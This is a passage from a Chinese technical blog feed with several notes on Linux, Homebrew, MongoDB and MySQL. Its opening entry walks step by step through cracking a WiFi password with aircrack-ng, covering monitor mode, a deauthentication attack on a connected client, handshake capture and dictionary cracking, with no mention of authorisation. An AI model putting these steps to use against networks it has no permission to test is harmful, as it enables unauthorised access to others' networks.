class="meta prompt_"># </span><span class="language-bash">修改系统默认语言为中文</span></span><br><span class="line">dpkg-reconfigure locales</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用空格键取消勾选en_US.UTF-8.UTF-8选项</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">勾选[ ]zh_CN.GBK_GBK和[ ]zh-CN.UTF-8.UTF-8两个选项</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用reboot命令重启机器使其配置生效</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><h4 id="5-安装相关工具"><a href="#5-安装相关工具" class="headerlink" title="5.安装相关工具"></a>5.安装相关工具</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装rtl8812au网卡驱动</span></span><br><span class="line">apt-get install realtek-rtl88xxau-dkms</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装Wicd网络管理器</span></span><br><span class="line">apt-get install wicd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装谷歌输入法</span></span><br><span class="line">apt-get install fcitx fcitx-googlepinyin</span><br></pre></td></tr></table></figure><h3 id="二、破解"><a href="#二、破解" class="headerlink" title="二、破解"></a>二、破解</h3><h4 id="1-结束进程"><a href="#1-结束进程" class="headerlink" title="1.结束进程"></a>1.结束进程</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airmon-ng check kill</span><br></pre></td></tr></table></figure><h4 id="2-载入网卡"><a href="#2-载入网卡" class="headerlink" title="2.载入网卡"></a>2.载入网卡</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airmon-ng start wlan0（自己的网卡名）</span><br></pre></td></tr></table></figure><h4 id="3-建立监听"><a href="#3-建立监听" class="headerlink" title="3.建立监听"></a>3.建立监听</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0</span><br></pre></td></tr></table></figure><h4 id="4-模拟WiFi信号"><a href="#4-模拟WiFi信号" class="headerlink" title="4.模拟WiFi信号"></a>4.模拟WiFi信号</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airodump-ng --ivs -w wifi-passwd --bssid WiFi的MAC -c ch wlan0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参数</span></span><br><span class="line">–ivs：指定生成文件的格式，这里格式是ivs（比如：abc.ivs）</span><br><span class="line">-w：指定文件的名称叫什么，这里叫wifi-pass</span><br><span class="line">–bssid：目标WiFi的MAC地址</span><br><span class="line">-c：指定我们模拟的WiFi的信道（ch）</span><br></pre></td></tr></table></figure><h4 id="5-攻击目标"><a href="#5-攻击目标" class="headerlink" title="5.攻击目标"></a>5.攻击目标</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aireplay-ng -0 20 -a WiFi的MAC -c 客户端的MAC wlan0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参数</span></span><br><span class="line">-0 ：发送工具数据包的数量，这里是20个(无限次攻击改成0)</span><br><span class="line">-a ：指定目标AP的MAC地址</span><br><span class="line">-c ：指定用户的MAC地址，（正在使用WiFi的客户端的MAC）</span><br></pre></td></tr></table></figure><p>出现信息（WPA handshake）密码信息抓取成功，抓取到的密码默认保存在主目录中</p><h4 id="6-破解密码文件"><a href="#6-破解密码文件" class="headerlink" title="6.破解密码文件"></a>6.破解密码文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aircrack-ng wifi-passwd-01.ivs -w /mnt/hgfs/Share/word.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参数</span></span><br><span class="line">wifi-pass-01.ivs：密码文件</span><br><span class="line">-w：指定密码字典</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No50：Linux查看服务器配置</title>
      <link href="/posts/d7720e0.html"/>
      <url>/posts/d7720e0.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、服务器型号"><a href="#一、服务器型号" class="headerlink" title="一、服务器型号"></a>一、服务器型号</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Alibaba Cloud 阿里云</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Tencent Cloud 腾讯云</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Amazon EC2 亚马逊云</span></span><br><span class="line">dmidecode|grep &quot;System Information&quot; -A9|egrep &quot;Manufacturer|Product&quot;</span><br></pre></td></tr></table></figure><h3 id="二、操作系统"><a href="#二、操作系统" class="headerlink" title="二、操作系统"></a>二、操作系统</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当前操作系统发行版信息</span></span><br><span class="line">cat /etc/redhat-release</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">操作系统发行版详细信息</span></span><br><span class="line">sudo yum install -y redhat-lsb</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><h3 id="三、CPU"><a href="#三、CPU" class="headerlink" title="三、CPU"></a>三、CPU</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CPU统计信息</span></span><br><span class="line">lscpu</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CPU型号</span></span><br><span class="line">cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">物理CPU个数</span></span><br><span class="line">cat /proc/cpuinfo| grep &quot;physical id&quot;| sort| uniq| wc -l</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每个物理CPU中core的个数(即核数)</span></span><br><span class="line">cat /proc/cpuinfo| grep &quot;cpu cores&quot;| uniq</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">逻辑CPU的个数</span></span><br><span class="line">cat /proc/cpuinfo| grep &quot;processor&quot;| wc -l</span><br></pre></td></tr></table></figure><h3 id="四、内存"><a href="#四、内存" class="headerlink" title="四、内存"></a>四、内存</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">概要内存使用情况[-g是以GB为单位；也可以使用-m，即以MB为单位]</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">total:总计物理内存的大小</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">used:已使用多大</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">free:可用有多少</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Shared:多个进程共享的内存总额</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Buffers/cached:磁盘缓存的大小</span></span><br><span class="line">free -g</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内存硬件信息</span></span><br><span class="line">dmidecode -t memory</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内存详细使用情况</span></span><br><span class="line">cat /proc/meminfo</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内存的插槽数,已经使用多少插槽，每条内存多大</span></span><br><span class="line">dmidecode|grep -A5 &quot;Memory Device&quot;|grep Size|grep -v Range</span><br></pre></td></tr></table></figure><h3 id="五、硬盘"><a href="#五、硬盘" class="headerlink" title="五、硬盘"></a>五、硬盘</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">硬盘和分区分布</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">NAME:这是块设备名</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MAJ:MIN:本栏显示主要和次要设备号</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">RM:本栏显示设备是否可移动设备</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SIZE:本栏列出设备的容量大小信息</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">RO:该项表明设备是否为只读</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">TYPE:本栏显示块设备是否是磁盘或磁盘上的一个分区</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MOUNTPOINT:本栏指出设备挂载的挂载点</span></span><br><span class="line">lsblk</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">硬盘和分区的详细信息</span></span><br><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><h3 id="六、其他"><a href="#六、其他" class="headerlink" title="六、其他"></a>六、其他</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网卡的硬件信息</span></span><br><span class="line">lspci | grep -i &#x27;eth&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显卡运行状况</span></span><br><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No49：Linux的buffer-cache内存占用过高</title>
      <link href="/posts/c919212f.html"/>
      <url>/posts/c919212f.html</url>
      
        <content type="html"><![CDATA[<p>在Linux系统中，我们经常用free命令来查看系统内存的使用状态。</p><p>先简要介绍一下buffers和cached是什么意思：</p><ul><li>什么是buffer&#x2F;cache？</li></ul><p>buffer和cache是两个在计算机技术中被用滥的名词，放在不通语境下会有不同的意义。</p><p>在Linux的内存管理中，这里的buffer指Linux内存的：Buffer cache。这里的cache指Linux内存中的：Page cache。翻译成中文可以叫做缓冲区缓存和页面缓存。</p><p>在历史上，它们一个（buffer）被用来当成对io设备写的缓存，而另一个（cache）被用来当作对io设备的读缓存，这里的io设备，主要指的是块设备文件和文件系统上的普通文件。</p><p>但是现在，它们的意义已经不一样了。在当前的内核中，page cache顾名思义就是针对内存页的缓存，说白了就是，如果有内存是以page进行分配管理的，都可以使用page<br>cache作为其缓存来管理使用。</p><p>当然，不是所有的内存都是以页（page）进行管理的，也有很多是针对块（block）进行管理的。</p><p>这部分内存使用如果要用到cache功能，则都集中到buffer cache中来使用。（从这个角度出发，是不是buffer cache改名叫做block<br>cache更好？）</p><p>然而，也不是所有块（block）都有固定长度，系统上块的长度主要是根据所使用的块设备决定的，而页长度在X86上无论是32位还是64位都是4k。</p><p>明白了这两套缓存系统的区别，就可以理解它们究竟都可以用来做什么了。</p><ul><li>什么是page cache？</li></ul><p>Page cache主要用来作为文件系统上的文件数据的缓存来用，尤其是针对当进程对文件有read／write操作的时候。</p><p>如果你仔细想想的话，作为可以映射文件到内存的系统调用：mmap是不是很自然的也应该用到page cache？</p><p>在当前的系统实现里，page cache也被作为其它文件类型的缓存设备来用，所以事实上page cache也负责了大部分的块设备文件的缓存工作。</p><ul><li>什么是buffer cache</li></ul><p>Buffer cache则主要是设计用来在系统对块设备进行读写的时候，对块进行数据缓存的系统来使用。</p><p>这意味着某些对块的操作会使用buffer cache进行缓存，比如我们在格式化文件系统的时候。一般情况下两个缓存系统是一起配合使用的。</p><p>比如当我们对一个文件进行写操作的时候，page cache的内容会被改变，而buffer cache则可以用来将page标记为不同的缓冲区，并记录是哪一个缓冲区被修改了。</p><p>这样，内核在后续执行脏数据的回写（writeback）时，就不用将整个page写回，而只需要写回修改的部分即可。</p><ul><li>如何回收cache？</li></ul><p>Linux内核会在内存将要耗尽的时候，触发内存回收的工作，以便释放出内存给急需内存的进程使用。一般情况下，这个操作中主要的内存释放都来自于对buffer／cache的释放。</p><p>尤其是被使用更多的cache空间。既然它主要用来做缓存，只是在内存够用的时候加快进程对文件的读写速度，那么在内存压力较大的情况下，当然有必要清空释放cache，作为free空间分给相关进程使用。所以一般情况下，我们认为buffer&#x2F;cache空间可以被释放，这个理解是正确的。</p><p>但是这种清缓存的工作也并不是没有成本。理解cache是干什么的就可以明白清缓存必须保证cache中的数据跟对应文件中的数据一致，才能对cache进行释放。所以伴随着cache清除的行为的，一般都是系统IO飙高。因为内核要对比cache中的数据和对应硬盘文件上的数据是否一致，如果不一致需要写回，之后才能回收。</p><p>在系统中除了内存将被耗尽的时候可以清缓存以外，我们还可以使用下面这个文件来人工触发缓存清除的操作：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/sys/vm/drop_caches</span><br></pre></td></tr></table></figure><p>当然，这个文件可以设置的值分别为1、2、3。它们所表示的含义为：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1表示清除pagecache。</span></span><br><span class="line">echo 1 &gt; /proc/sys/vm/drop_caches</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2表示清除回收slab分配器中的对象（包括目录项缓存和inode缓存）。</span></span><br><span class="line">echo 2 &gt; /proc/sys/vm/drop_caches</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3表示清除pagecache和slab分配器中的缓存对象。</span></span><br><span class="line">echo 3 &gt; /proc/sys/vm/drop_caches</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No48：Mac必备工具之brew</title>
      <link href="/posts/fd2f07b4.html"/>
      <url>/posts/fd2f07b4.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、安装-brew"><a href="#1、安装-brew" class="headerlink" title="1、安装 brew"></a>1、安装 brew</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认安装脚本</span></span><br><span class="line">/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">国内加速版</span></span><br><span class="line">/bin/bash -c &quot;$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install)&quot;</span><br></pre></td></tr></table></figure><h3 id="2、基本用法"><a href="#2、基本用法" class="headerlink" title="2、基本用法"></a>2、基本用法</h3><p>以nodejs为例，执行下面命令即可，安装目录在&#x2F;usr&#x2F;local&#x2F;Cellar</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">brew install nodejs</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果需要指定版本，在@后面指定版本号</span></span><br><span class="line">brew install nodejs@0.9</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新</span></span><br><span class="line">brew upgrade nodejs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载</span></span><br><span class="line">brew remove nodejs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出当前安装的软件</span></span><br><span class="line">brew list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询与nodejs相关的可用软件</span></span><br><span class="line">brew search nodejs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询nodejs的安装信息</span></span><br><span class="line">brew info nodejs</span><br></pre></td></tr></table></figure><h3 id="3、brew-services"><a href="#3、brew-services" class="headerlink" title="3、brew services"></a>3、brew services</h3><p>brew services是一个非常强大的工具，可以用来管理各种服务的启停，有点像linux里面的services，非常方便。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line">brew services start nodejs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止</span></span><br><span class="line">brew services stop nodejs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启</span></span><br><span class="line">brew services restart nodejs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出当前的状态</span></span><br><span class="line">brew services list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">brew services配置路径：/usr/local/etc/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">brew services日志路径：/usr/local/var/log</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No47：MongoDB常见问题汇总</title>
      <link href="/posts/5fe5d009.html"/>
      <url>/posts/5fe5d009.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、建立数据库连接时出现了很多Warnings"><a href="#1、建立数据库连接时出现了很多Warnings" class="headerlink" title="1、建立数据库连接时出现了很多Warnings"></a>1、建立数据库连接时出现了很多Warnings</h3><ul><li>第1种</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Access control is not enabled for the database.</span><br></pre></td></tr></table></figure><p>出现这个警告的原因是新版本的MongDB为了让我们创建一个安全的数据库必须要进行验证，也就是要操作数据库前要添加用户和密码，MongoDB更新后，不建议简单的建立连接了。</p><p>添加用户和密码的方法自行查找。</p><ul><li>第2种</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/sys/kernel/mm/transparent_hugepage/enabled is ‘always’.</span><br><span class="line">/sys/kernel/mm/transparent_hugepage/defrag is ‘always’.</span><br></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;never&quot; &gt; /sys/kernel/mm/transparent_hugepage/enabled</span><br><span class="line">echo &quot;never&quot; &gt; /sys/kernel/mm/transparent_hugepage/defrag</span><br></pre></td></tr></table></figure><ul><li>第3种</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">soft rlimits too low. rlimits set to 1024 processes, 65535 files. Number of processes should be at least 32767.5 : 0.5 times number of files.</span><br></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/security/limits.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加一下几行：</span></span><br><span class="line">mongod soft nofile 64000</span><br><span class="line">mongod hard nofile 64000</span><br><span class="line">mongod soft nproc 32000</span><br><span class="line">mongod hard nproc 32000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启mongod：</span></span><br><span class="line">systemctl restart mongod</span><br><span class="line">service mongod restart</span><br></pre></td></tr></table></figure><h3 id="2、Windows10安装成功后服务无法启动问题解决"><a href="#2、Windows10安装成功后服务无法启动问题解决" class="headerlink" title="2、Windows10安装成功后服务无法启动问题解决"></a>2、Windows10安装成功后服务无法启动问题解决</h3><ul><li><p>配置mongodb的环境变量，然后添加到Path</p></li><li><p>使用管理员身份打开cmd，然后删除安装时默认创建的mongodb服务,注意这里的服务名要换成你本机的</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sc delete MongoDB</span><br></pre></td></tr></table></figure><ul><li>重新创建服务</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mongod.exe --dbpath &quot;C:\Program Files\MongoDB\Server\4.0\data&quot; --logpath &quot;C:\Program Files\MongoDB\Server\4.0\log\db.log&quot; --install --serviceName &quot;mongodb&quot; --logappend --directoryperdb</span><br></pre></td></tr></table></figure><ul><li>命令启动服务</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net start mongodb</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No46：MongoDB数据导出与导入</title>
      <link href="/posts/e077eb17.html"/>
      <url>/posts/e077eb17.html</url>
      
        <content type="html"><![CDATA[<ul><li>导出</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">针对库的mongodump</span></span><br><span class="line">mongodump -h IP --port 端口 -u 用户名 -p 密码 -d 数据库 -c 表 -o 文件存放路径</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">    -h 指明数据库宿主机的IP</span><br><span class="line">    -u 指明数据库的用户名</span><br><span class="line">    -p 指明数据库的密码</span><br><span class="line">    -d 指明数据库的名字</span><br><span class="line">    -c 指明collection的名字</span><br><span class="line">    -o 指明到要导出的文件名</span><br><span class="line">    -q 指明导出数据的过滤条件</span><br><span class="line">    --port 指明数据库的端口</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">针对库中表的mongoexport</span></span><br><span class="line">mongoexport -h IP --port 端口 -u 用户名 -p 密码 -d 数据库 -c 表名 -f 字段 -q 条件导出 --csv -o 文件名</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">    -f 导出指定字段，以逗号分割，-f uid,name,age导出uid,name,age这三个字段</span><br><span class="line">    -q 可以根据查询条件导出，-q &#x27;&#123; &quot;uid&quot; : &quot;100&quot; &#125;&#x27; 导出uid为100的数据</span><br><span class="line">    --csv 表示导出的文件格式为csv的。这个比较有用，因为大部分的关系型数据库都是支持csv，在这里有共同点</span><br></pre></td></tr></table></figure><ul><li>导入</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">针对库的mongodump</span></span><br><span class="line">mongorestore -h IP --port 端口 -u 用户名 -p 密码 -d 数据库 --drop 文件存在路径</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">    --drop：先删除所有的记录，然后恢复</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">针对库中表的mongoexport</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">恢复整表导出的非csv文件</span></span><br><span class="line">mongoimport -h IP --port 端口 -u 用户名 -p 密码 -d 数据库 -c 表名 --upsert --drop 文件名</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">    --upsert:插入或者更新现有数据</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">恢复部分字段的导出文件</span></span><br><span class="line">mongoimport -h IP --port 端口 -u 用户名 -p 密码 -d 数据库 -c 表名 --upsertFields 字段 --drop 文件名</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">    --upsertFields:更新部分的查询字段，必须为索引,以逗号分隔</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">恢复导出的csv文件</span></span><br><span class="line">mongoimport -h IP --port 端口 -u 用户名 -p 密码 -d 数据库 -c 表名 --type 类型 --headerline --upsert --drop 文件名</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">    --type：导入的文件类型，默认json</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No45：MySQL的内连接、外连接、左连接、右连接、全连接</title>
      <link href="/posts/9280a343.html"/>
      <url>/posts/9280a343.html</url>
      
        <content type="html"><![CDATA[<ul><li><p>MySQL版本：Server version: 5.7.25 MySQL Community Server (GPL)</p></li><li><p>数据库表：a_table、b_table</p></li><li><p>主题：内连接、左连接（左外连接）、右连接（右外连接）、全连接（全外连接）</p></li><li><p>用两个表（a_table、b_table），关联字段a_table.a_id和b_table.b_id来演示一下MySQL的内连接、外连接（左(外)连接、右(外)连接、全(<br>外)连接）。</p></li></ul><h3 id="1、插入测试数据"><a href="#1、插入测试数据" class="headerlink" title="1、插入测试数据"></a>1、插入测试数据</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `a_table` (</span><br><span class="line">  `a_id` int(11) DEFAULT NULL,</span><br><span class="line">  `a_name` varchar(10) DEFAULT NULL,</span><br><span class="line">  `a_part` varchar(10) DEFAULT NULL</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">CREATE TABLE `b_table` (</span><br><span class="line">  `b_id` int(11) DEFAULT NULL,</span><br><span class="line">  `b_name` varchar(10) DEFAULT NULL,</span><br><span class="line">  `b_part` varchar(10) DEFAULT NULL</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><h3 id="2、内连接"><a href="#2、内连接" class="headerlink" title="2、内连接"></a>2、内连接</h3><p>关键字：inner join on</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">select * from a_table a inner join b_table b on a.a_id = b.b_id;</span><br></pre></td></tr></table></figure><p>组合两个表中的记录，返回关联字段相符的记录。</p><h3 id="3、左连接（左外连接）"><a href="#3、左连接（左外连接）" class="headerlink" title="3、左连接（左外连接）"></a>3、左连接（左外连接）</h3><p>关键字：left join on &#x2F; left outer join on</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">select * from a_table a left join b_table b on a.a_id = b.b_id;</span><br></pre></td></tr></table></figure><p>left join是left outer join的简写，它的全称是左外连接，是外连接中的一种。</p><p>左(外)连接，左表(a_table)的记录将会全部表示出来，而右表(b_table)只会显示符合搜索条件的记录。右表记录不足的地方均为NULL。</p><h3 id="4、右连接（右外连接）"><a href="#4、右连接（右外连接）" class="headerlink" title="4、右连接（右外连接）"></a>4、右连接（右外连接）</h3><p>关键字：right join on &#x2F; right outer join on</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">select * from a_table a right join b_table b on a.a_id = b.b_id;</span><br></pre></td></tr></table></figure><p>right join是right outer join的简写，它的全称是右外连接，是外连接中的一种。</p><p>与左(外)连接相反，右(外)连接，左表(a_table)只会显示符合搜索条件的记录，而右表(b_table)的记录将会全部表示出来。左表记录不足的地方均为NULL。</p><h3 id="5、全连接（全外连接）"><a href="#5、全连接（全外连接）" class="headerlink" title="5、全连接（全外连接）"></a>5、全连接（全外连接）</h3><p>MySQL目前不支持此种方式，可以用其他方式替代解决。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No44：MySQL截取字段、字符串</title>
      <link href="/posts/86bc9bb4.html"/>
      <url>/posts/86bc9bb4.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、字符串截取：left-str-length"><a href="#1、字符串截取：left-str-length" class="headerlink" title="1、字符串截取：left(str, length)"></a>1、字符串截取：left(str, length)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">select left(&#x27;testdata&#x27;, 3);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">| tes |</span></span><br></pre></td></tr></table></figure><h3 id="2、字符串截取：right-str-length"><a href="#2、字符串截取：right-str-length" class="headerlink" title="2、字符串截取：right(str, length)"></a>2、字符串截取：right(str, length)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">select right(&#x27;testdata&#x27;, 3);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">| ata |</span></span><br></pre></td></tr></table></figure><h3 id="3、字符串截取：substring-str-pos-、substring-str-pos-len"><a href="#3、字符串截取：substring-str-pos-、substring-str-pos-len" class="headerlink" title="3、字符串截取：substring(str, pos)、substring(str, pos, len)"></a>3、字符串截取：substring(str, pos)、substring(str, pos, len)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从字符串的第4个字符开始取,取到最后</span></span><br><span class="line">select substring(&#x27;testdata&#x27;, 4);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">| tdata |</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从字符串的第4个字符开始取,取2个字符</span></span><br><span class="line">select substring(&#x27;testdata&#x27;, 4, 2);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">| td |</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从字符串的倒数第4个字符开始取,取到最后</span></span><br><span class="line">select substring(&#x27;testdata&#x27;, -4);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">| data |</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从字符串的倒数第4个字符开始取,取2个字符</span></span><br><span class="line">select substring(&#x27;testdata&#x27;, -4, 2);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">| da |</span></span><br></pre></td></tr></table></figure><h3 id="4、字符串截取：substring-index-str-delim-count"><a href="#4、字符串截取：substring-index-str-delim-count" class="headerlink" title="4、字符串截取：substring_index(str, delim, count)"></a>4、字符串截取：substring_index(str, delim, count)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span 